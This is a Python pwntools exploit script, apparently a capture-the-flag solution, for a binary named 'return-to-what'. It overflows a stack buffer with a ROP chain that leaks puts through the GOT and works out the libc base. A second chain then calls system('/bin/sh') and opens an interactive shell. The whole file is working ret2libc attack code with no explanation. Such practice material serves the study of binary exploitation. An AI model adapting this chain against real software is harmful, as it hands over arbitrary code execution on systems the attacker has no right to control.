#!/usr/bin/env python3

from pwn import *

context.clear(arch='amd64')

elf = ELF('./return-to-what_patched')
libc = ELF('./libc.so.6')


r = process('./return-to-what_patched')

rop = ROP(elf)
rop.puts(elf.got.puts)
rop.raw(elf.sym.main)
log.info(rop.dump())

r.clean()
r.writeline(b'A'*56 + rop.chain())

leak = unpack(r.readline()[:-1], 'all')
libc.address = leak - 0x84450
log.info(f'leak = {hex(leak)}')
log.info(f'libc = {hex(libc.address)}')


rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']).address)
rop.system(next(libc.search(b'/bin/sh')))
log.info(rop.dump())

r.writeline(b'A'*56 + rop.chain())
r.clean()
r.interactive()

